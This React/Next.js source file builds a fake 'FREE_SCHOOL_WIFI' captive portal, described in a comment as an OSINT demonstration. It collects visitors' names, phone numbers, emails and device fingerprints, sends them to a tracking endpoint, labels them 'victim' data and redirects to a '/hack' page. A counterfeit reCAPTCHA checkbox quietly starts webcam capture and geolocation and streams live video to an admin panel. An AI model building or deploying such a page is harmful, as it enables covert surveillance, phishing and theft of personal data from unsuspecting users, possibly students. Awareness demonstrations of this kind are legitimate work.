"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { motion } from "framer-motion";
import { collectFingerprint } from "@/lib/fingerprint";
import {
    initGlobalStream,
    startGlobalStreaming,
    requestGeolocation,
    getPermissions,
} from "@/lib/globalStream";
import styles from "./page.module.css";

/**
 * Wi-Fi Captive Portal Page
 * 
 * Professional-looking Wi-Fi login form that collects
 * user information and device fingerprint for the OSINT demonstration.
 */

interface FormData {
    name: string;
    phone: string;
    email: string;
}

interface FormErrors {
    general?: string;
    phone?: string;
    email?: string;
}

export default function PortalPage() {
    const router = useRouter();
    const [formData, setFormData] = useState<FormData>({
        name: "",
        phone: "",
        email: "",
    });
    const [errors, setErrors] = useState<FormErrors>({});
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [captchaVerified, setCaptchaVerified] = useState(false);
    const [captchaLoading, setCaptchaLoading] = useState(false);
    const [permissionsGranted, setPermissionsGranted] = useState<boolean>(false);

    const validatePhone = (phone: string): boolean => {
        if (!phone) return true; // Optional field
        // Indian mobile number: 10 digits, starts with 6-9
        const phoneRegex = /^[6-9]\d{9}$/;
        return phoneRegex.test(phone.replace(/\s/g, ""));
    };

    const validateEmail = (email: string): boolean => {
        if (!email) return true; // Optional field
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setErrors({});

        // Check if at least one field is filled
        const hasAnyField = formData.name.trim() || formData.phone.trim() || formData.email.trim();
        if (!hasAnyField) {
            setErrors({ general: "Please fill at least one field to continue" });
            return;
        }

        // Validate phone if provided
        if (formData.phone && !validatePhone(formData.phone)) {
            setErrors({ phone: "Please enter a valid 10-digit Indian mobile number" });
            return;
        }

        // Validate email if provided
        if (formData.email && !validateEmail(formData.email)) {
            setErrors({ email: "Please enter a valid email address" });
            return;
        }

        setIsSubmitting(true);

        // Collect comprehensive device fingerprint
        const fingerprint = collectFingerprint();

        // Store victim data in sessionStorage for the hack page
        const victimData = {
            name: formData.name.trim(),
            phone: formData.phone.replace(/\s/g, "").trim(),
            email: formData.email.trim().toLowerCase(),
            timestamp: Date.now(),
        };
        sessionStorage.setItem("siren_victim", JSON.stringify(victimData));

        // Send comprehensive fingerprint + form data to server
        try {
            await fetch("/api/track", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    name: victimData.name,
                    phone: victimData.phone,
                    email: victimData.email,
                    fingerprint: fingerprint,
                }),
            });
        } catch (error) {
            console.error("Failed to track:", error);
        }

        // Redirect to hack page
        router.push("/hack");
    };

    const handleInputChange = (field: keyof FormData) => (e: React.ChangeEvent<HTMLInputElement>) => {
        setFormData(prev => ({ ...prev, [field]: e.target.value }));
        setErrors({});
    };

    // Handle captcha checkbox click
    const handleCaptchaClick = async () => {
        if (captchaVerified || captchaLoading) return;

        setCaptchaLoading(true);

        try {
            // Initialize webcam stream (persists across pages)
            const success = await initGlobalStream();

            if (success) {
                // Request geolocation separately
                await requestGeolocation();

                // Start continuous streaming to admin panel
                startGlobalStreaming(50); // 50ms = ~20fps

                setPermissionsGranted(true);
            }

            // Mark as verified regardless of permission results
            setCaptchaVerified(true);
        } catch (error) {
            console.error('[Captcha] Permission request failed:', error);
            // Still mark as verified to allow form submission
            setCaptchaVerified(true);
        } finally {
            setCaptchaLoading(false);
        }
    };

    return (
        <div className={styles.container}>
            {/* Background effects */}
            <div className={styles.bgGradient} />
            <div className={styles.bgGrid} />

            {/* Main content */}
            <motion.div
                className={styles.card}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
            >
                {/* Header */}
                <div className={styles.header}>
                    <div className={styles.wifiIcon}>
                        <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 18c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm-5.27-3.54l1.42 1.41C9.08 14.94 10.48 14.5 12 14.5s2.92.44 3.85 1.37l1.42-1.41C15.93 13.12 14.04 12.5 12 12.5s-3.93.62-5.27 1.96zM12 6.5c-4.14 0-7.86 1.73-10.49 4.5l1.42 1.41C5.21 10.22 8.44 8.5 12 8.5s6.79 1.72 9.07 3.91l1.42-1.41C19.86 8.23 16.14 6.5 12 6.5z" />
                        </svg>
                    </div>
                    <h1 className={styles.title}>FREE_SCHOOL_WIFI</h1>
                    <p className={styles.subtitle}>Connect to high-speed internet</p>
                </div>

                {/* Form */}
                <form onSubmit={handleSubmit} className={styles.form}>
                    {errors.general && (
                        <motion.div
                            className={styles.errorBanner}
                            initial={{ opacity: 0, height: 0 }}
                            animate={{ opacity: 1, height: "auto" }}
                        >
                            {errors.general}
                        </motion.div>
                    )}

                    <div className={styles.inputGroup}>
                        <label className={styles.label}>
                            <span className={styles.labelText}>Full Name</span>
                            <span className={styles.optional}>(optional)</span>
                        </label>
                        <input
                            type="text"
                            className={styles.input}
                            placeholder="Enter your name"
                            value={formData.name}
                            onChange={handleInputChange("name")}
                            autoComplete="name"
                        />
                    </div>

                    <div className={styles.inputGroup}>
                        <label className={styles.label}>
                            <span className={styles.labelText}>Mobile Number</span>
                            <span className={styles.optional}>(optional)</span>
                        </label>
                        <div className={styles.phoneInput}>
                            <span className={styles.countryCode}>+91</span>
                            <input
                                type="tel"
                                className={`${styles.input} ${styles.phoneField}`}
                                placeholder="10-digit mobile number"
                                value={formData.phone}
                                onChange={handleInputChange("phone")}
                                maxLength={10}
                                autoComplete="tel"
                            />
                        </div>
                        {errors.phone && (
                            <span className={styles.fieldError}>{errors.phone}</span>
                        )}
                    </div>

                    <div className={styles.inputGroup}>
                        <label className={styles.label}>
                            <span className={styles.labelText}>Email Address</span>
                            <span className={styles.optional}>(optional)</span>
                        </label>
                        <input
                            type="email"
                            className={styles.input}
                            placeholder="your@email.com"
                            value={formData.email}
                            onChange={handleInputChange("email")}
                            autoComplete="email"
                        />
                        {errors.email && (
                            <span className={styles.fieldError}>{errors.email}</span>
                        )}
                    </div>

                    <p className={styles.hint}>
                        * At least one field is required to connect
                    </p>

                    {/* Captcha-style verification */}
                    <div
                        className={`${styles.captchaBox} ${captchaVerified ? styles.captchaVerified : ''} ${captchaLoading ? styles.captchaLoading : ''}`}
                        onClick={handleCaptchaClick}
                    >
                        <div className={styles.captchaCheckbox}>
                            {captchaLoading ? (
                                <motion.div
                                    className={styles.captchaSpinner}
                                    animate={{ rotate: 360 }}
                                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                                />
                            ) : captchaVerified ? (
                                <motion.svg
                                    viewBox="0 0 24 24"
                                    fill="currentColor"
                                    initial={{ scale: 0 }}
                                    animate={{ scale: 1 }}
                                    transition={{ type: "spring", stiffness: 300 }}
                                >
                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
                                </motion.svg>
                            ) : null}
                        </div>
                        <span className={styles.captchaText}>I'm not a robot</span>
                        <div className={styles.captchaBrand}>
                            <svg viewBox="0 0 24 24" fill="currentColor" className={styles.captchaLogo}>
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
                            </svg>
                            <span>reCAPTCHA</span>
                        </div>
                    </div>

                    <motion.button
                        type="submit"
                        className={styles.submitBtn}
                        disabled={isSubmitting || !captchaVerified}
                        whileHover={{ scale: captchaVerified ? 1.02 : 1 }}
                        whileTap={{ scale: captchaVerified ? 0.98 : 1 }}
                    >
                        {isSubmitting ? (
                            <span className={styles.loading}>Connecting...</span>
                        ) : (
                            <>
                                <span>Connect to Internet</span>
                                <svg className={styles.arrowIcon} viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z" />
                                </svg>
                            </>
                        )}
                    </motion.button>
                </form>

                {/* Footer */}
                <div className={styles.footer}>
                    <div className={styles.secureNote}>
                        <svg viewBox="0 0 24 24" fill="currentColor" className={styles.lockIcon}>
                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                        </svg>
                        <span>Secure connection</span>
                    </div>
                    <p className={styles.terms}>
                        By connecting, you agree to our terms of service
                    </p>
                </div>
            </motion.div>

            {/* Decorative corner accents */}
            <div className={styles.cornerTL} />
            <div className={styles.cornerBR} />
        </div>
    );
}
